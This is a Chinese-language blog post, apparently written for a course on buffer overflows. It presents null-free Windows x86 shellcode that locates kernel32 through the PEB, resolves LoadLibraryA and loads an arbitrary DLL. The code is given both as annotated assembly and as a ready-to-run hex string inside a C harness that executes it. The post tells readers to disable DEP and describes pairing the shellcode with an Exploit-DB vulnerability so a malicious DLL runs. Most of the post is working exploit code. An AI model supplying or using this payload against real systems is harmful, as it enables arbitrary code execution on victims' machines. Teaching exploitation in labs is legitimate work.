\-\-- layout: post title: Windows x86 LoadLibraryA
Shellcode（Null-Free） date: \'2017-09-29T10:48:00.000-07:00\' author:
聖豪馬 tags: - BOF - Shellcode - Windows - ASM modified\_time:
\'2017-09-29T10:48:10.554-07:00\' thumbnail:
https://2.bp.blogspot.com/-LTE2NzEEUP4/Wc6GatyXCGI/AAAAAAAAIYI/SKNP6\_axawANjkZuUuNF\_cO8H55aOTYwQCLcBGAs/s72-c/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2017-09-30%2B%25E4%25B8%258A%25E5%258D%25881.41.16.png
blogger\_id:
tag:blogger.com,1999:blog-1335849442109808564.post-6431850252610208826
blogger\_orig\_url:
http://helloadr.blogspot.com/2017/09/windows-x86-loadlibrarya-shellcodenull.html
\-\--

### murmur

因為部分課程緣故需要展示 Buffer Overflow 可以幹嘛，但是不想包太長的
Shellcode、單純 Demo 彈小算盤好像又太弱了XD。所以拿網路上別人寫好的
Shellcode 小改了一下，分享出來原始 Assembly Code
方便之後有需要的人可以做修改、開發自己的 Shellcode。\
\

#### Cheat Engine AutoASM 腳本

``` {.prettyprint}
// windows x86 LoadLibraryA("xxx.dll")
// author: aaaddress1@chroot.org
alloc(script, 1024)

script:
xor edx,edx
mov dl,30
mov edx,fs:[edx]
mov edx,[edx+0C]
mov edx,[edx+1C]
mov eax,[edx+08]
mov esi,[edx+20]
mov edx,[edx]
cmp byte ptr [esi+0C], 33 /* kernel'3'2.dll -> 0x33 */
db 75 f2 // jne -0x0d

mov    edi,eax //eax = handle of kernel32.dll
add    edi,DWORD PTR [eax+0x3c]
mov    edx,DWORD PTR [edi+0x78]
add    edx,eax
mov    edi,DWORD PTR [edx+0x20]
add    edi,eax
xor    ebp,ebp
mov    esi,DWORD PTR [edi+ebp*4]
add    esi,eax
inc    ebp
//esi = API name
cmp    DWORD PTR [esi],0x64616f4c
db 75 f2
cmp    DWORD PTR [esi+0x8],0x41797261
db 75 e9

mov    edi,DWORD PTR [edx+0x24]
add    edi,eax
mov    bp,WORD PTR [edi+ebp*2] //bp = index

mov    edi,DWORD PTR [edx+0x1c]
add    edi,eax // Export Table: uint32_t Address[]

mov    edi,[edi+ebp*4-04]
add    edi,eax // Address of LoadLibraryA = edi

push 0x7f6c6c64 // dll\x20
push 0x2e787878 // xxx.
xor dword ptr [esp+07],0x7f
push esp
call edi
```

### HEX Shellcode

<div>

當然大部分人應該沒那個需求要小改，\
純粹 Demo 的話可以參考下面我已經幫你轉好的十六進位 Shellcode
字串直接使用：\
\

``` {.prettyprint}
// LoadLibraryA Shellcode Null-Free
// Author: aaaddress1@chroot.org
int main(void) {
 
 char shellcode[] =
  "\x31\xD2\xB2\x30\x64\x8B\x12\x8B" \
  "\x52\x0C\x8B\x52\x1C\x8B\x42\x08" \
  "\x8B\x72\x20\x8B\x12\x80\x7E\x0C" \
  "\x33\x75\xF2\x8B\xF8\x03\x78\x3C" \
  "\x8B\x57\x78\x01\xC2\x8B\x7A\x20" \
  "\x01\xC7\x31\xED\x8B\x34\xAF\x01" \
  "\xC6\x45\x81\x3E\x4C\x6F\x61\x64" \
  "\x75\xF2\x81\x7E\x08\x61\x72\x79" \
  "\x41\x75\xE9\x8B\x7A\x24\x01\xC7" \
  "\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01" \
  "\xC7\x8B\x7C\xAF\xFC\x01\xC7\x68" \
  "\x64\x6C\x6C\x7F\x68\x78\x78\x78" \
  "\x2E\x83\x74\x24\x07\x7F\x54\xFF" \
  "\xD7";
  
 printf("length: %i\n", strlen(shellcode));
 ((void(*)())shellcode)();
}
```

</div>

上面的程式碼存成 \*.cpp 拿個隨便編譯器跑起來會像下面這樣\
（喔對，記得 DEP 要關喔）\

<div>

::: {.separator style="clear: both; text-align: center;"}
[![](https://2.bp.blogspot.com/-LTE2NzEEUP4/Wc6GatyXCGI/AAAAAAAAIYI/SKNP6_axawANjkZuUuNF_cO8H55aOTYwQCLcBGAs/s320/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2017-09-30%2B%25E4%25B8%258A%25E5%258D%25881.41.16.png){width="311"
height="320"}](https://2.bp.blogspot.com/-LTE2NzEEUP4/Wc6GatyXCGI/AAAAAAAAIYI/SKNP6_axawANjkZuUuNF_cO8H55aOTYwQCLcBGAs/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2017-09-30%2B%25E4%25B8%258A%25E5%258D%25881.41.16.png)
:::

\

</div>

### 效果

\
底下是我拿 2016 隨便一個 Exploit-DB 上挖來的漏洞小改一下，大概像這樣XD\
Shellcode 觸發後會去載入 xxx.dll，就可以在 DLL 內塞髒東西跑起來啦。\

::: {.separator style="clear: both; text-align: center;"}
[![](https://4.bp.blogspot.com/-fjH061cLbrg/Wc6Bn4dHVhI/AAAAAAAAIX4/xOC4QvZOYXMU0sSjq-4jDliUzgzyVO1nQCLcBGAs/s320/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2017-09-30%2B%25E4%25B8%258A%25E5%258D%25881.23.00.png){width="320"
height="239"}](https://4.bp.blogspot.com/-fjH061cLbrg/Wc6Bn4dHVhI/AAAAAAAAIX4/xOC4QvZOYXMU0sSjq-4jDliUzgzyVO1nQCLcBGAs/s1600/%25E8%259E%25A2%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2017-09-30%2B%25E4%25B8%258A%25E5%258D%25881.23.00.png)
:::

<div>

\

</div>
